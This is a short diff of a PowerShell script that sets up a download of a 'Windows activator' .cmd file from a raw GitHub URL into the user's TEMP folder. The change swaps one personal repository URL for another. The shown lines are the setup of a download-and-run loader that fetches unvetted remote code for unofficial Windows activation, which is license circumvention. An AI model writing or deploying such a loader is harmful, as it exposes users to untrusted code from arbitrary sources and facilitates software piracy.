@@ -1,6 +1,6 @@
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://raw.githubusercontent.com/Pheanoukma/powershell-1-/main/WINDOWS-ACTIVATOR.CMD'
+$DownloadURL = 'https://raw.githubusercontent.com/EdwardThong/windows-activ/main/Main%20Activator.cmd'
 
 $FilePath = "$env:TEMP\WINDOWS-ACTIVATOR.cmd"
 
